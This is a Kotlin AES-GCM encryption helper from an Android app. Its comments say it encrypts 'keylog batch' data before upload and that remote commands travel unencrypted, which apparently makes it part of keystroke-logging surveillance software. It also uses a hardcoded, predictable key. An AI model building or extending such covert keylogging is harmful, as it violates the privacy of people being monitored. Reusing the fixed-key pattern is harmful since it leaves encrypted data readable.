package com.bestiecourt.app.core.encryption

import android.util.Base64
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * Local-only AES-GCM for keylog batch protection before upload.
 * Not used for command path (commands are plain as required).
 */
object AesGcmEncryptor {

    private const val GCM_IV_LENGTH = 12
    private const val GCM_TAG_LENGTH = 128

    // Demo key – in real deployment derive from device-specific material
    private val DEMO_KEY: ByteArray = ByteArray(32) { (it * 7 + 13).toByte() }

    fun encrypt(plain: String): String {
        val key: SecretKey = SecretKeySpec(DEMO_KEY, "AES")
        val iv = ByteArray(GCM_IV_LENGTH).also { SecureRandom().nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
        val encrypted = cipher.doFinal(plain.toByteArray(Charsets.UTF_8))
        val combined = iv + encrypted
        return Base64.encodeToString(combined, Base64.NO_WRAP)
    }

    fun decrypt(encoded: String): String {
        val combined = Base64.decode(encoded, Base64.NO_WRAP)
        val iv = combined.copyOfRange(0, GCM_IV_LENGTH)
        val ciphertext = combined.copyOfRange(GCM_IV_LENGTH, combined.size)
        val key: SecretKey = SecretKeySpec(DEMO_KEY, "AES")
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
        return String(cipher.doFinal(ciphertext), Charsets.UTF_8)
    }
}
